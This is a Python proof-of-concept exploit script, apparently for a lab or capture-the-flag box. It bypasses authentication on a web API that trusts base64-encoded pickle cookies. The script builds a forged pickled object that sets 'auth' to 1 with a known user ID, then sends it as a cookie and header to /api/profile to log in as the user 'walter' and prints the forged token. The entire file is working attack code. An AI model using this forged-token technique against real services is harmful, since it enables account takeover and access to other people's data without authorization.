#!/usr/bin/env python3 

import pickle
import base64
import requests 
import traceback
import argparse
from urllib.parse import urljoin 

def pickleInsecureDesAuthBypass(target):
    """
    Generate Python's pickle serialized object 
    """
    # JSON object - existing account details 
    json_acc_details = {
        "auth": 1, # change status to `1` instead of `0` 
        "userid": "905b4296-e591-4b81-8ad6-b9abf90bf07d" # walter's user ID returned from `/api/sqeaks`
    }

    # Serialize walter's account details to pickle (protocol 3 for compatibility with Python 3.x)
    acc_details_pickled = pickle.dumps(json_acc_details, protocol=3)

    # Base64 encode the acc_details_pickled data
    acc_details_pickled_b64_encoded = base64.b64encode(acc_details_pickled).decode("utf-8")

    """
    Authenticate as `walter` 
    """
    profile_url = urljoin(target, "/api/profile")
    cookies = {"authtoken": f"{acc_details_pickled_b64_encoded}"}
    headers = {"authtoken": f"{acc_details_pickled_b64_encoded}"}
    try:
        profileRes = requests.get(profile_url, headers=headers, cookies=cookies, allow_redirects=False)
        if "\"username\": \"walter\"" in profileRes.text and profileRes.status_code == 200:
            print("[+] Authenticated as `walter`")
            print("[+] Authentication Token: ", cookies)
            return acc_details_pickled_b64_encoded
        else:
            print("[-] Failed to authenticate as `walter`")
    except Exception as e:
        print("[-] Error sending the /api/profile reqeust: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Python pickle insecure deserialization authentication bypass")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    args = parser.parse_args()

    pickleInsecureDesAuthBypass(args.target)

if __name__ == "__main__":
    main()
